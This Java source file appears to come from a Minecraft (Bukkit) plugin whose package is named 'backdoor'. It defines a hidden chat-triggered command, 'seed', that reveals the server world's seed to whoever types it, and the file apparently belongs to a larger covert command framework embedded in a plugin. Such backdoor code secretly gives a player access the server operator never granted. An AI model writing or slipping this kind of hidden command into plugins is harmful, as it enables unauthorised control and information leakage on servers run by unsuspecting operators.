package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.World;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "seed", aliases = {"seed"})
public class SeedCommand extends Command {

    public void onExec (PlayerChatEvent event, ArrayList<String> args) {
        World world = event.getPlayer().getWorld();
        long seed = world.getSeed();
        event.getPlayer().sendMessage("Seed: " + seed);
    }
}
